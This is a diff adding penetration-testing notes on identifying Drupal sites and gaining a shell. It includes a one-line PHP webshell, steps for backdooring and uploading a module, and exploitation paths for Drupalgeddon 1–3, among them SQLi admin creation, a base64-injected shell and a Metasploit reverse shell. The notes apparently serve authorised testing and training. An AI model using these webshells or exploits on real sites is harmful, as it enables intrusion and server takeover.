@@ -1,0 +1,117 @@
+🔎 Drupal Discovery & Enumeration – “Is it Drupal?”
+Start with nmap -sCV -A like always. Then:
+
+✅ Fingerprint CMS:
+
+curl the root page → look for:
+
+meta name="Generator" → “Drupal”
+
+/node/1 working → classic Drupal node structure
+
+robots.txt → refs to /node, /sites, etc.
+
+/CHANGELOG.txt or /README.txt → maybe version
+
+🛠️ Tools:
+
+droopescan scan drupal -u http://target
+
+Finds version, modules, login page, juicy URLs
+
+Manual:
+
+Check for /modules/<modname>/
+
+curl for /admin, /user/login, etc.
+
+⚔️ Drupal Attacks – 3 Core Paths to Shell
+🥇 If Admin Access Gained:
+Upload Shell via Module or PHP Filter
+
+PHP Filter Module:
+
+Add a Basic Page
+
+<?php system($_GET[<param>]); ?> with Text Format: PHP Code
+
+Access at /node/<id>?<param>=id
+
+Backdoored Module Upload:
+
+Grab a legit module (e.g., captcha)
+
+Drop in your shell.php + .htaccess
+
+Repackage and upload via Extend > Install Module
+
+Visit modules/captcha/shell.php?<param>=id
+
+📌 Always Clean Up
+
+Remove webshell
+
+Note it in the report: filename, path, hash
+
+🥈 If No Admin – Known Vulns aka Drupalgeddons
+Drupalgeddon 1 (CVE-2014-3704)
+
+Drupal 7.0–7.31
+
+Pre-auth SQLi → Add admin user
+
+Use drupalgeddon.py to create hacker:pwnd
+
+Then shell via PHP Filter
+
+Drupalgeddon 2 (CVE-2018-7600)
+
+Drupal < 7.58, 8.5.1
+
+Upload any file via form abuse
+
+Use base64 to encode your shell, inject it with script
+
+Validate: curl /mrb3n.php?<param>=id
+
+Drupalgeddon 3 (CVE-2018-7602)
+
+Authenticated RCE (need valid session + node deletion rights)
+
+Metasploit: exploit/multi/http/drupal_drupageddon3
+
+Provide valid session cookie and node ID → reverse shell
+
+🧠 TL;DR Mindset for Drupal:
+See "Drupal"?
+
+droopescan first
+
+Try /CHANGELOG.txt, /node/1, /user/login
+
+Got Admin?
+
+PHP Filter or Upload Backdoored Module
+
+No Admin?
+
+Check for Drupalgeddons by version:
+
+<7.32 = DG1
+
+<7.58/8.5.1 = DG2
+
+7.x/8.x w/ node perms = DG3
+
+If no shells work, move on. Don't get tunnel vision. Screenshot it, report it.
+
+🔥 Bonus:
+If you find the site uses Drupal AND Apache + PHP, then treat it like a hybrid:
+
+Check for misconfigs in /sites/, .htaccess, .git, etc.
+
+Default creds
+
+Dangerous file uploaders
+
+  
